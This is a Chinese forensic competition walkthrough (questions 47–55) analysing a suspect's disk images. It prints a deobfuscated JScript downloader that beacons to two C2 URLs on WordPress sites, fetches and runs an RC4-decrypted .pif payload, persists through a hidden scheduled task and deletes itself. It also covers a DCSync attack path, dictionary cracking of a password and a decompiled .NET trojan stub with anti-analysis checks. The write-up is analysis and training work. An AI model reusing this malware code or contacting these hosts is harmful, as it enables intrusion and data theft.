} catch (e) {
  WScript.Quit();
}

function jSm8() {
  var c9lr = Fv6b();
  while (true) {
    for (var i = 0; i &lt; CKpR.length; i++) {
      var Ysyo = CKpR[i];
      var f3cb = XEWG(Ysyo, c9lr);
      switch (f3cb) {
        case &quot;good&quot;:
          break;
        case &quot;exit&quot;:
          WScript.Quit();
          break;
        case &quot;work&quot;:
          XBL3(Ysyo);
          break;
        case &quot;fail&quot;:
          tbMu();
          break;
        default:
          break;
      }
      TfOh();
    }
    WScript.Sleep((Math.random() * 300 + 3600) * 1000);
  }
}

function bIdG() {
  var spq3 = this['\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'];
  var zBVv = new spq3('\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C');
  return zBVv;
}

function XBL3(B_TG) {
  var YIme = wyKN + LIxF.substring(0, LIxF.length - 2) + &quot;pif&quot;;
  var Kpxo = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
  Kpxo.OPEN(&quot;post&quot;, B_TG, false);
  Kpxo.SETREQUESTHEADER(&quot;user-agent:&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64); &quot; + Sz8k());
  Kpxo.SETREQUESTHEADER(&quot;content-type:&quot;, &quot;application/octet-stream&quot;);
  Kpxo.SETREQUESTHEADER(&quot;content-length:&quot;, &quot;4&quot;);
  Kpxo.SEND(&quot;work&quot;);
  if (QUjy.FILEEXISTS(YIme)) {
    QUjy.DELETEFILE(YIme);
  }
  if (Kpxo.STATUS == 200) {
    var m3mH = new ActiveXObject(&quot;ADODB.STREAM&quot;);
    m3mH.TYPE = 1;
    m3mH.OPEN();
    m3mH.WRITE(Kpxo.responseBody);
    m3mH.Position = 0;
    m3mH.Type = 2;
    m3mH.CharSet = &quot;437&quot;;
    var c0xi = m3mH.ReadText(m3mH.Size);
    var ptF0 = FXx9(&quot;2f532d6baec3d0ec7b1f98aed4774843&quot;, cz_b(c0xi));
    NoRS(ptF0, YIme);
    m3mH.Close();
  }
  var ruGx = TfOh();
  c5ae(YIme, B_TG);
  WScript.Sleep(30000);
  QUjy.DELETEFILE(YIme);
}

function tbMu() {
  QUjy.DELETEFILE(WScript.SCRIPTFULLNAME);
  eV_C(&quot;TaskManager&quot;, &quot;Windows Task Manager&quot;, w5mY, v_FileName, &quot;EzZETcSXyKAdF_e5I2i1&quot;, wyKN, false);
  KhDn(&quot;TaskManager&quot;);
  WScript.Quit();
}

function XEWG(uXHK, hm2j) {
  try {
    var Kpxo = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
    Kpxo.OPEN(&quot;post&quot;, uXHK, false);
    Kpxo.SETREQUESTHEADER(&quot;user-agent:&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64); &quot; + Sz8k());
    Kpxo.SETREQUESTHEADER(&quot;content-type:&quot;, &quot;application/octet-stream&quot;);
    var rRi3 = hLit(hm2j, true);
    Kpxo.SETREQUESTHEADER(&quot;content-length:&quot;, rRi3.length);
    Kpxo.SEND(rRi3);
    return Kpxo.responseText;
  } catch (e) {
    return &quot;&quot;;
  }
}

function Sz8k() {
  var n9mV = &quot;&quot;;
  var dc9V = WScript.CreateObject(&quot;WScript.Network&quot;);
  var rRi3 = tpO8 + dc9V.ComputerName + w5mY;
  for (var i = 0; i &lt; 16; i++) {
    var YsXA = 0;
    for (var j = i; j &lt; rRi3.length - 1; j++) {
      YsXA = YsXA ^ rRi3.charCodeAt(j);
    }
    YsXA = (YsXA % 10);
    n9mV = n9mV + YsXA.toString(10);
  }
  n9mV = n9mV + tpO8;
  return n9mV;
}

function rGcR() {
  v_FileName = wyKN + LIxF.substring(0, LIxF.length - 2) + &quot;js&quot;;
  QUjy.COPYFILE(WScript.ScriptFullName, wyKN + LIxF);
  var HFp7 = (Math.random() * 150 + 350) * 1000;
  WScript.Sleep(HFp7);
  eV_C(&quot;TaskManager&quot;, &quot;Windows Task Manager&quot;, w5mY, v_FileName, &quot;EzZETcSXyKAdF_e5I2i1&quot;, wyKN, true);
}

function Fv6b() {
  var m_Rr = wyKN + &quot;~dat.tmp&quot;;
  for (var i = 0; i &lt; auME.length; i++) {
    WE86.Run(&quot;cmd.exe /c &quot; + auME[i] + &quot;\&quot;&quot; + m_Rr + &quot;\&quot;&quot;, 0, true);
  }
  var nRVN = UspD(m_Rr);
  WScript.Sleep(1000);
  QUjy.DELETEFILE(m_Rr);
  return FXx9(&quot;2f532d6baec3d0ec7b1f98aed4774843&quot;, nRVN);
}

function c5ae(YIme, B_TG) {
  try {
    if (QUjy.FILEEXISTS(YIme)) {
      WE86.Run(&quot;\&quot;&quot; + YIme + &quot;\&quot;&quot;);
    }
  } catch (e) {
    var Kpxo = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
    Kpxo.OPEN(&quot;post&quot;, B_TG, false);
    var ePMy = &quot;error&quot;;
    Kpxo.SETREQUESTHEADER(&quot;user-agent:&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64); &quot; + Sz8k());
    Kpxo.SETREQUESTHEADER(&quot;content-type:&quot;, &quot;application/octet-stream&quot;);
    Kpxo.SETREQUESTHEADER(&quot;content-length:&quot;, ePMy.length);
    Kpxo.SEND(ePMy);
    return &quot;&quot;;
  }
}

function RPbY(r_X5) {
  var w8rG = &quot;0123456789ABCDEF&quot;;
  var yjrw = w8rG.substr(r_X5 &amp; 15, 1);
  while (r_X5 &gt; 15) {
    r_X5 &gt;&gt;&gt;= 4;
    yjrw = w8rG.substr(r_X5 &amp; 15, 1) + yjrw;
  }
  return yjrw;
}

function NptO(jlEi) {
  return parseInt(jlEi, 16);
}

function eV_C(Bjmr, RT6x, O7Ec, YBwP, T9Px, egNr, rmGH) {
  try {
    var BGfI = WScript.CreateObject(&quot;Schedule.Service&quot;);
    BGfI.Connect();
    var w2cQ = BGfI.GetFolder(&quot;WPD&quot;);
    var xSm3 = BGfI.NewTask(0);
    xSm3.Principal.UserId = O7Ec;
    xSm3.Principal.LogonType = 6;
    var wK2F = xSm3.RegistrationInfo;
    wK2F.Description = RT6x;
    wK2F.Author = O7Ec;
    var aYbx = xSm3.Settings;
    aYbx.Enabled = true;
    aYbx.StartWhenAvailable = true;
    aYbx.Hidden = rmGH;
    var oSP7 = &quot;2015-07-12T11:47:24&quot;;
    var svaG = &quot;2020-03-21T08:00:00&quot;;
    var LDoN = xSm3.Triggers;
    var r9EC = LDoN.Create(9);
    r9EC.StartBoundary = oSP7;
    r9EC.EndBoundary = svaG;
    r9EC.Id = &quot;LogonTriggerId&quot;;
    r9EC.UserId = O7Ec;
    r9EC.Enabled = true;
    var gQu9 = xSm3.Actions.Create(0);
    gQu9.Path = YBwP;
    gQu9.Arguments = T9Px;
    gQu9.WorkingDirectory = egNr;
    w2cQ.RegisterTaskDefinition(Bjmr, xSm3, 6, &quot;&quot;, &quot;&quot;, 3);
    return true;
  } catch (Err) {
    return false;
  }
}

function KhDn(Bjmr) {
  try {
    var UGgw = false;
    var BGfI = WScript.CreateObject(&quot;Schedule.Service&quot;);
    BGfI.Connect();
    var w2cQ = BGfI.GetFolder(&quot;WPD&quot;);
    var FLs6 = w2cQ.GetTasks(0);
    if (FLs6.count &gt;= 0) {
      var gk1H = new Enumerator(FLs6);
      for (; !gk1H.atEnd(); gk1H.moveNext()) {
        if (gk1H.item().name == Bjmr) {
          w2cQ.DeleteTask(Bjmr, 0);
          UGgw = true;
        }
      }
    }
  } catch (Err) {
    return false;
  }
}

function cz_b(S3Ws) {
  var n9mV = [];
  var mvAu = S3Ws.length;
  for (var i = 0; i &lt; mvAu; i++) {
    var wtVX = S3Ws.charCodeAt(i);
    if (wtVX &gt;= 128) {
      var h = b92A['' + RPbY(wtVX)];
      wtVX = NptO(h);
    }
    n9mV.push(wtVX);
  }
  return n9mV;
}

function NoRS(ExY2, igeK) {
  var m3mH = WScript.CreateObject(&quot;ADODB.Stream&quot;);
  m3mH.type = 2;
  m3mH.Charset = &quot;iso-8859-1&quot;;
  m3mH.Open();
  m3mH.WriteText(ExY2);
  m3mH.Flush();
  m3mH.Position = 0;
  m3mH.SaveToFile(igeK, 2);
  m3mH.close();
}

function Blgx(gaWo) {
  wyKN = &quot;c:\\Users\\&quot; + w5mY + &quot;\\AppData\\Local\\Microsoft\\Windows\\&quot;;
  if (!QUjy.FOLDEREXISTS(wyKN))
    wyKN = &quot;c:\\Users\\&quot; + w5mY + &quot;\\AppData\\Local\\Temp\\&quot;;
  if (!QUjy.FOLDEREXISTS(wyKN))
    wyKN = &quot;c:\\Documents and Settings\\&quot; + w5mY + &quot;\\Application Data\\Microsoft\\Windows\\&quot;;
  return wyKN;
}

function FXx9(Z_3F, VMd7) {
  var NNSX = [];
  var JDro = 0;
  var KagY;
  var n9mV = '';
  for (var i = 0; i &lt; 256; i++) {
    NNSX[i] = i;
  }
  for (var i = 0; i &lt; 256; i++) {
    JDro = (JDro + NNSX[i] + Z_3F.charCodeAt(i % Z_3F.length)) % 256;
    KagY = NNSX[i];
    NNSX[i] = NNSX[JDro];
    NNSX[JDro] = KagY;
  }
  var i = 0;
  var JDro = 0;
  for (var y = 0; y &lt; VMd7.length; y++) {
    i = (i + 1) % 256;
    JDro = (JDro + NNSX[i]) % 256;
    KagY = NNSX[i];
    NNSX[i] = NNSX[JDro];
    NNSX[JDro] = KagY;
    n9mV += String.fromCharCode(VMd7[y] ^ NNSX[(NNSX[i] + NNSX[JDro]) % 256]);
  }
  return n9mV;
}
第5行即写了俩网站

m3mH.Type = 2;m3mH.CharSet = '437';m3mH.Open();m3mH.LoadFromFile(zDmy);var c0xi = m3mH.ReadText;m3mH.Close();return cz_b(c0xi);}var CKpR = new Array ("http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php","http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php");

### 47 接上题，当C2服务器返回“work”指令时，脚本下载并执行的最终文件扩展名是什么?【答案格式： exe】
#### 答案
pif

#### 过程
具体文件见上题

既然说返回“work”指令才会下载文件，那在原文件中必然存在一个判断，判断指令是否是work

那直接在文档中查找work就行了


<img src="/Picture/WpDF/Pinghang/2026Group/116.png" width="1203" title="" crop="0,0,1,1" id="u5c3f6d1b" class="ne-image">

注意下面这张

<img src="/Picture/WpDF/Pinghang/2026Group/117.png" width="1179.5" title="" crop="0,0,1,1" id="u30f172ab" class="ne-image">

work是发送出去的（send），不是接收

找到的其他的都不是work，而是像什么network这些东西里面夹杂着的work
找到了，这里判断是否是work，如果是就进入函数XBL3

去看XBL3

注意到开头


<img src="/Picture/WpDF/Pinghang/2026Group/118.png" width="776.5" title="" crop="0,0,1,1" id="ubb422bdf" class="ne-image">

其拼接了一个字符串YIme（其实看到有一个pif，长得很像后缀，而且也确实是常见的文件后缀就感觉应该是了）

这里或许开头还无法确认是否是文件名，其下面的QUjy.FILEEXISTS这个函数直接表明这玩意就是个文件路径

但目前不能确认是否是最终执行文件


<img src="/Picture/WpDF/Pinghang/2026Group/119.png" width="239.5" title="" crop="0,0,1,1" id="ud0711dbf" class="ne-image">

这里是用来删除旧文件的

然后下面紧接着


<img src="/Picture/WpDF/Pinghang/2026Group/120.png" width="541.5" title="" crop="0,0,1,1" id="u6b29f7db" class="ne-image">

这里实例化了一个流对象m3mH，往里面写了一堆东西

然后这个流对象将数据赋值给了c0xi，经过FXx9解密又扔给了ptF0（去看代码就知道，FXx9完全就是个类似RC4的玩意），将ptF0和前面那个文件路径一起扔给了NoRS


<img src="/Picture/WpDF/Pinghang/2026Group/121.png" width="426.5" title="" crop="0,0,1,1" id="u31b58f33" class="ne-image">

显而易见，这玩意就是将ptF0里面的东西写入YIme的

写完文件后出if块到c5ae函数


<img src="/Picture/WpDF/Pinghang/2026Group/122.png" width="804" title="" crop="0,0,1,1" id="u76c1f443" class="ne-image">

可以看到，在c5ae函数中启用了这个文件

那么此时即可确认，最终执行的文件就是这个YIme所代表的文件，其扩展名是pif

### 48 接上题，如果与C2通信失败，脚本会调用哪个函数尝试自毁并清理痕迹?【答案格式： Aabc】
#### 答案
tbMu

#### 过程
同样，先定位回work（毕竟work就相当于是通信成功），后面肯定有后续处理


<img src="/Picture/WpDF/Pinghang/2026Group/123.png" width="796.5" title="" crop="0,0,1,1" id="u1a60f173" class="ne-image">

不难发现work下面就是fail

调用了tbMu

### 49 请分析早起王的PC镜像，该PC中neo4j数据库的密码是多少?【答案格式；abc3】
#### 答案
1qazxsw2

#### 过程
（这我怎么想得到口丫）

在图片里面有一张奇怪的图片

其名字是Internet Penetration，意味内网穿透


<img src="/Picture/WpDF/Pinghang/2026Group/124.png" width="1297" title="" crop="0,0,1,1" id="ud18df5f9" class="ne-image">

于是推测（？）这张照片存在隐写

用盲水印确实找出来东西了


<img src="/Picture/WpDF/Pinghang/2026Group/125.png" width="795" title="" crop="0,0,1,1" id="ue9e051ae" class="ne-image">

这里说同开机密码


<img src="/Picture/WpDF/Pinghang/2026Group/126.png" width="1439" title="" crop="0,0,1,1" id="u741de27d" class="ne-image">

### 50 根据早起王笔录内容，早起王曾经对某企业进行过渗透攻击，请分析域内实体关系， FILESERVER.XIAORANG.LAB对XIAORANG.LAB域拥有什么控 制权限?【答案格式： ABCabc】
#### 答案
DCSync

#### 过程
在前面挂载的vc容器的非隐藏层（就是用34题答案解出来的磁盘）里面有bloodhound和neo4j的数据库，但是似乎那里没东西

那个数据库似乎找不到FILESERVER.XIAORANG.LAB

（PS，desktop版本的neo4j数据库用户名都是neo4j，密码前面解锁过了）

（刚打开只有俩节点不必惊慌，右键一下节点再左键，查找最短路径即可


<img src="/Picture/WpDF/Pinghang/2026Group/127.png" width="1269" title="" crop="0,0,1,1" id="u20bd63cb" class="ne-image">

这时候去看起早王的U盘，会发现里面也有bloodhound，有gost，这些都是渗透用的工具


<img src="/Picture/WpDF/Pinghang/2026Group/128.png" width="1326" title="" crop="0,0,1,1" id="uf056d5bd" class="ne-image">

里面那个bloodhound是sharphound搜集来的json文件压缩包

将那个压缩包下载下来并导入bloodhound（导入自己bloodhound的就行，直接把这个zip往里面拖入即可）

找不到相关信息
<img src="/Picture/WpDF/Pinghang/2026Group/129.png" width="1439.5" title="" crop="0,0,1,1" id="u1b87c28b" class="ne-image">

那我问你，
 DCSync  
这个关系呢？？？？
然后里面就能显示出来，这俩关系是DCSync

也是一样，随便找个点右键选择最短路径就能出来


<img src="/Picture/WpDF/Pinghang/2026Group/130.png" width="1261" title="" crop="0,0,1,1" id="u42a8785c" class="ne-image">

PS，这是我用虚拟机里面的那个bloodhound跑出来的（或者说电脑检材里面那个VC的表层加密容器里面的那个）
我在自己电脑上的bloodhound就是跑不出来
不是，为什么？？？
### 51 (?) 根据早起王笔录内容，早起王在渗透过程中已成功控制ZHANGXIN@XIAORANG.LAB,请结合域内实体关系图分析，早起王获取域控权限的完整攻击轨迹 是什么?【答案格式： XXXXXXXX@XXXXXXX.XXX->XXXXXXXXXX.XXXXXXX.XXX->XXXXXXXX.XXX】
#### 答案 (?) 
ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB

(did未通过，但是所有wp答案都是它)

#### 过程
理应就是这条线：


<img src="/Picture/WpDF/Pinghang/2026Group/131.png" width="990.5" title="" crop="0,0,1,1" id="uf3adb922" class="ne-image">

注意，中间的ACCOUNT OPERATORS@XIAORANG.LAB并不需要（首先是因为加上了与格式不符），而且，ZHANGXIN@XIAORANG.LAB是ACCOUNT OPERATORS@XIAORANG.LAB组的成员（MemberOf），对于后面的组，只是一个传递权限的载体，将权限传递给ZHANGXIN@XIAORANG.LAB用的

### 52 早起王在PC中记录过自己的犯罪动机并对其进行加密，请使用社工的方式破解加密文件，并提交密码。【答案格式： aabc3】
#### 答案
#### 过程
首先，文件在这里


<img src="/Picture/WpDF/Pinghang/2026Group/132.png" width="1266.5" title="" crop="0,0,1,1" id="u84b1213c" class="ne-image">

然后用无影（TScan）生成字典

在前面找文件的时候，应该可以会发现有个文件叫早起王简历，按常识即可知道这玩意里面肯定藏（并非藏）有个人信息


<img src="/Picture/WpDF/Pinghang/2026Group/133.png" width="1105" title="" crop="0,0,1,1" id="u56c73f70" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/134.png" width="1300.5" title="" crop="0,0,1,1" id="ub3fa3cc1" class="ne-image">

然后根据已有信息生成字典


<img src="/Picture/WpDF/Pinghang/2026Group/135.png" width="1309.5" title="" crop="0,0,1,1" id="u40f5925e" class="ne-image">

使用passware kit

这里是如何添加自定义字典
<img src="/Picture/WpDF/Pinghang/2026Group/136.png" width="1000.5" title="" crop="0,0,1,1" id="u566b35a0" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/137.png" width="987" title="" crop="0,0,1,1" id="u243e6f3c" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/138.png" width="960" title="" crop="0,0,1,1" id="uae653602" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/139.png" width="1007" title="" crop="0,0,1,1" id="u0ee50101" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/140.png" width="1021.5" title="" crop="0,0,1,1" id="u762330ca" class="ne-image">

文件拖进来，保持顺序勾上，愿意的话可以把其他字典移除了

<img src="/Picture/WpDF/Pinghang/2026Group/141.png" width="1017" title="" crop="0,0,1,1" id="ubc6d0f7b" class="ne-image">

添加完成后将字典勾选上爆破即可（其实中等大小即可）

不确定是不是自己的字典看看下面的示例密码即可

如果自带字典全删了，能勾选的也就只有一个（）最下面那个选项恒定为字典编译器

直接添加攻击即可


<img src="/Picture/WpDF/Pinghang/2026Group/142.png" width="982" title="" crop="0,0,1,1" id="u38cd0dab" class="ne-image">

得到密码


<img src="/Picture/WpDF/Pinghang/2026Group/143.png" width="1019.5" title="" crop="0,0,1,1" id="u0a6847ef" class="ne-image">



有一说一，解压出来了不看看吗（（

小故事写的挺好的（（（（（


<img src="/Picture/WpDF/Pinghang/2026Group/144.png" width="1244.5" title="" crop="0,0,1,1" id="u803d0190" class="ne-image">

### 53 早起王曾给倩倩发送过一封钓鱼邮件，请找到并计算附件MD5值【答案格式：字母不区分大小写】
#### 答案
5436b61ea58adb794804e3f18ce53f2a

#### 过程
既然说是早起王给倩倩发的，那把两边的邮箱都打开来看看


<img src="/Picture/WpDF/Pinghang/2026Group/145.png" width="566" title="" crop="0,0,1,1" id="uc1036494" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/146.png" width="898.5" title="" crop="0,0,1,1" id="ud1f32ef5" class="ne-image">

这俩电脑上都有邮箱，全都打开来看看


<img src="/Picture/WpDF/Pinghang/2026Group/147.png" width="863" title="" crop="0,0,1,1" id="u425a5b33" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/148.png" width="801.5" title="" crop="0,0,1,1" id="u34eff639" class="ne-image">

早起王发了俩，但是倩倩只收到一个，那应该就是这里的这个海牛VPN的压缩文件了

压缩文件拉出来后，解压密码在邮件里面写了


<img src="/Picture/WpDF/Pinghang/2026Group/149.png" width="1285" title="" crop="0,0,1,1" id="a5jlv" class="ne-image">

解压出来电脑秒报毒


<img src="/Picture/WpDF/Pinghang/2026Group/150.png" width="1318.5" title="" crop="0,0,1,1" id="uf8d0331b" class="ne-image">

直接算他的MD5即可

```bash
certutil -hashfile <文件名> MD5
```


<img src="/Picture/WpDF/Pinghang/2026Group/151.png" width="499.5" title="" crop="0,0,1,1" id="uca9272b0" class="ne-image">

### 54 接上题，编译木马使用的.NET版本是多少?【答案格式：1.1.45141】
#### 答案
4.0.30319

#### 过程
没敢在自己电脑里面做（）

用die打开exe即可看到信息（我把die拖到虚拟机里面去了）


<img src="/Picture/WpDF/Pinghang/2026Group/152.png" width="1206" title="" crop="0,0,1,1" id="pgg4E" class="ne-image">

### 55 接上题，木马中有多少反沙箱和反调试的检测逻辑?【答案格式：8】
#### 答案
5

#### 过程
用dnSpy打开这个木马

刚进去就能看到

其展示了程序入口点在何处，定位到该位置（单击过去即可）


<img src="/Picture/WpDF/Pinghang/2026Group/153.png" width="1282" title="" crop="0,0,1,1" id="uce8c489c" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/154.png" width="1420" title="" crop="0,0,1,1" id="ucb47ef2f" class="ne-image">

using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
    // Token: 0x02000008 RID: 8
    public class oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U
    {
        // Token: 0x06000026 RID: 38 RVA: 0x00002A48 File Offset: 0x00000C48
        [STAThread]
        public static void 8CBqemw89u44xYPchu85qRf8t1Kb7MrSwSSHdIK7O7VNarcvrvMnWLsldBYa()
        {
            Thread.Sleep(checked(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.p1HLccZBgOEiXLJPWR7MGHfAQxfHFJa5xi0mYnMrdlbNvTE2zD9nLEldT7zb * 1000));
            try
            {
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.ZIDZvDLAFbRYxsxkwMl1lB7DELyeP0rfiJNEILKuap1H9eXgbiPbiwGYX2g2 = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.ZIDZvDLAFbRYxsxkwMl1lB7DELyeP0rfiJNEILKuap1H9eXgbiPbiwGYX2g2));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.PjOzPaAZem6YRSiY73iqOnuhSIsTpJmmeYR23TelLywq50KJA7ITRso6eQWj = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.PjOzPaAZem6YRSiY73iqOnuhSIsTpJmmeYR23TelLywq50KJA7ITRso6eQWj));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.uOJTJdC1HuPnY7xGUKCVXdob11jaXDot6DaLkEHtlik255I34dAgKgpePnrM = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.uOJTJdC1HuPnY7xGUKCVXdob11jaXDot6DaLkEHtlik255I34dAgKgpePnrM));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.tEcXo2432ATvkU8ifrMlTSOiGO1G3sGNZRTy6G0EbDFiN3BWkUbrhUYMxUZC = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.tEcXo2432ATvkU8ifrMlTSOiGO1G3sGNZRTy6G0EbDFiN3BWkUbrhUYMxUZC));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.QMNuWZu2nAhrN4vCJXXVJJ6rXPYjheog2O3JKqbePCETj5t8Y1KaOTCSa7k0 = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.QMNuWZu2nAhrN4vCJXXVJJ6rXPYjheog2O3JKqbePCETj5t8Y1KaOTCSa7k0));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.s6qNUlBh1I6DXfxJKXLS8vMqDb2zNIYNi5hhilJnX0Mbzr8B4g6F0vguJvMV));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.pAiK6SOy8HEO6uDLFXMlZSPdAbNKgcHqwR32QBERmGnbcKxg5SelHoKfUgGc = Environment.ExpandEnvironmentVariables(Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.pAiK6SOy8HEO6uDLFXMlZSPdAbNKgcHqwR32QBERmGnbcKxg5SelHoKfUgGc)));
                NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu));
				NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.WZkYJQQccjD5T1CeURgUhXfKErUOd2iOmZLqE3X2ot4M56ME6ZG8zQR2Ub1G = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.WZkYJQQccjD5T1CeURgUhXfKErUOd2iOmZLqE3X2ot4M56ME6ZG8zQR2Ub1G));
				NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.TWpgNdrzPbXNxjOwjHl7Bk3kQzFwaIkHgioRO2b6uJ9qXBYpgIkrYVEP0YDx = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.TWpgNdrzPbXNxjOwjHl7Bk3kQzFwaIkHgioRO2b6uJ9qXBYpgIkrYVEP0YDx));
				NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.39U6klKkfRunu4AJWlFFg8Gj1E3vVNiGNrr5yGLn1VkgOUqSSb0FojA3RYMT = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.39U6klKkfRunu4AJWlFFg8Gj1E3vVNiGNrr5yGLn1VkgOUqSSb0FojA3RYMT));
			}
			catch (Exception ex)
			{
				Environment.Exit(0);
			}
			if (!ACX0qTJzEzq40qP5qFxb.6NEoy1ymZv4FH17VRKK3())
			{
				Environment.Exit(0);
			}
			try
			{
				oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.AuPSZXXVSMF0DQRCvC2rt5MfcrYC48o7KO1SI69og2JLhf02Th6Xma2HOysY();
			}
			catch (Exception ex2)
			{
			}
			oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.j4d5GNXICPEVRtyjnlgCMXk7jToiY6J1mAs5nLQFxfcp708CM7Hr1XTxfCBg();
			string text = NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.pAiK6SOy8HEO6uDLFXMlZSPdAbNKgcHqwR32QBERmGnbcKxg5SelHoKfUgGc + &quot;\\&quot; + NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu;
			try
			{
				object fullName = new FileInfo(text).Directory.FullName;
				if (!Directory.Exists(Conversions.ToString(fullName)))
				{
					Directory.CreateDirectory(Conversions.ToString(fullName));
				}
				if (File.Exists(text))
				{
					FileInfo fileInfo = new FileInfo(text);
					fileInfo.Delete();
				}
				Thread.Sleep(1000);
				File.WriteAllBytes(text, File.ReadAllBytes(ACX0qTJzEzq40qP5qFxb.8qqIc9C1rZ7T3TBLTgSV));
			}
			catch (Exception ex3)
			{
			}
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo(&quot;schtasks.exe&quot;);
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
